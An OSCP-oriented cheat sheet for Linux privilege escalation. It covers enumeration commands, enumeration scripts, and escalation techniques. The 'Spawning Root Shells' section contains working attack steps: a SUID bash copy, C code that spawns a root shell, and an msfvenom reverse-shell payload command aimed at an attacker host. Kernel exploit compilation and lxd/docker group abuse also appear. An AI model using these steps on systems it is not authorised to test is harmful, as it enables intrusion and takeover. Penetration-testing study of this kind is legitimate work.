# OSCP Linux Privilege Escalation Cheat Sheet

Created by mr-b4rt0wsk1 on 07/01/2020

Edited with major additions on 07/01/2021

## What to look for

* Kernel Exploits - Last resort
* Service Exploits
    * Port Forwarding
* Weak File Permissions
    * /etc/passwd and /etc/shadow
    * Backups
* sudo
    * Known Password
    * Shell Escape Sequences
    * Abusing Intended Functionality
    * Environment Variables
        * LD_PRELOAD
        * LD_LIBRARY_PATH
* Cron Jobs
    * File Permissions
    * PATH Environment Variable
    * Wildcards
* SUID/SGID Files
    * Shell Escape Sequences
    * Known Exploits
    * Shared Object Injection
    * PATH Environment Variable
* Abusing Shell Features (older versions)
* Passwords and Keys
    * History Files
    * Config Files
    * SSH Keys
* NFS
    * no_root_squash
* Browse Directories
* /home, /opt, /var, /tmp

## Enumeration and Privilege Escalation Strategy

1. Manual Enumeration

    ### Basic

    * `whoami` - get current user
    * `id` - get the current user's user ID, group ID, and other information
    * `hostname` - get current computer name
    * `uname -ar` - get OS/kernel information
    * `cat /etc/issue`, `cat /etc/lsb-release`, `cat /etc/redhat-release` - get distribution type and version
    * `cat /proc/version` - get kernel verions and details
    * `ps aux` - shows proccess running for all users and additional information on them
    * `ps aux | grep "^root"` - only shows processes owned by root
    * `cat /etc/passwd` - can show what users exist on the computer
    * `crontab -l` - lists cron jobs for the current user
    * `cat /etc/crontab` - view system wide cron jobs
    * `sudo -l` - check for sudoer permissions

    ### Check for Interesting Software

    These directories tend to have interesting software:
    * `ls -lrta /opt`
    * `ls -lrta /var`
    * `ls -lrta /home`
    * `ls -lrta /tmp`
    * `ls -lrta /usr/local`
    * `ls -lrta /usr/local/src`
    * `ls -lrta /usr/local/bin`
    * `ls -lrta /usr/src`
    Enumerating program versions:
    * `<program> --version`
    * `<program> -v`
    * Debian: `dpkg -l | grep <program>`
    * Systems with rpm: `rpm -qa | grep <program>`

    ### File Permissions

    * `find / -perm -u=s -type f 2>/dev/null` - finds files with SUID set
    * `find / -perm -g=s -type f 2>/dev/null` - finds files with SGID set
    * `find / -perm -2 -type f 2>/dev/null` - finds world writable files
    * `ls -lrta *file*` - shows file permission details like user, group, SUID bit, etc. of a particular file
    * `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null` - find files with the SUID or SGID bit set and print out the path and the permissions

    ### Networking

    * `netstat -ano` - look at TCP/UDP connections and listening ports, as well as what process is associated with them
    * `ifconfig -a` - get networking information for the current computer
    * `iptables -L` - look at firewall rules
    * `arp -e` - check the ARP cache
    * `route` - check for cached IP and/or MAC addresses
    * `showmount -e <target IP>` - (run from attacker machine) will show the server's export list

2. Priv Esc Scripts

    ### LinEnum

    * `./LinEnum.sh` - basic run of the tool
    * Can copy files for export and serach for files containing a keyword
        * `mkdir export`
        * `./LinEnum.sh -k password -e export -t` - runs search with "password" keyword and thorough tests

    ### linux-smart-enumeration

    * `./lse.sh` - basic run of the tool
    * `./lse.sh -l 1 -i` - interesting results, doesn't prompt for user's password
    * `./lse.sh -l 2 -i` - shows all results, doesn't prompt for user's password

## Other

### Spawning Root Shells

* "rootbash" SUID
    * `cp /bin/bash /tmp/rootbash` - copy the bash binary
    * `chmod +s /tmp/rootbash` - make sure the SUID bit is set
    * `/tmp/rootbash -p` - run for a root shell

* Custom executable
    * If a root process executes another process that you can control, then you can compile this and use it to spawn a bash shell as root instead

    ```C
    int main() {
        setuid(0);
        system("/bin/bash -p");
    }
    ```

    * Compile with this command: `gcc -o <name> <filename.c>`

* msfvenom
    * `msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf`
    *  This can be caught using netcat or Metasploit's multi/handler

### Taking Advantage of lxd Group Permissions

* if the user is in the lxd group, they can read files on the filesystem as root
* this requires to download the alpine-builder, which should already be on your Kali machine
* full walkthrough on what commands to execute [here](https://www.hackingarticles.in/lxd-privilege-escalation/)

### Taking Advantage of Docker Group Permissions

* similar to lxd, if the user is in the docker group, they can read files on the filesystem as root
* full walkthrough on what commands to execute [here](https://root4loot.com/post/docker-privilege-escalation/)
* check out [GTFOBins](https://gtfobins.github.io/gtfobins/docker/#shell) as well
    * I can't remember if I had to install any alpine files for the lab.  I think GTFOBins one-liner just worked

### Kernel Exploits - Compiling Executables for Linux

* `/usr/share/linux-exploit-suggester/linux-exploit-suggester.sh -k 2.6.32` - useful tool for finding exploits based on the provided kernel version
* `gcc -o priv_esc64 exploit.c` - this is the simple way for 64-bit
* `gcc -m32 -o priv_esc32 18411.c` - this is the simple way for 32-bit. Example used is EDB #18411
* `gcc -Wl,--hash-style=both -m32 -o priv_esc32 9542.c` - some will require both hash styles. Example used is EDB #9542

### Port Forwarding

* `ssh -R 4444:127.0.0.1:3306 kali@192.168.221.129` - port forwarding example done via SSH

## Resources
* g0tmi1k's [blog](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
* Privilege Escalation [gitbook](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html)
* LinEnum [repo](https://github.com/rebootuser/LinEnum)
* linux-smart-enumeration [repo](https://github.com/diego-treitos/linux-smart-enumeration)
* lpeworkshop [repo](https://github.com/sagishahar/lpeworkshop)
* Tib3rius' Linux Privilege Escalation for OSCP & Beyond! [course](https://courses.tib3rius.com/p/linux-privilege-escalation-for-oscp-beyond)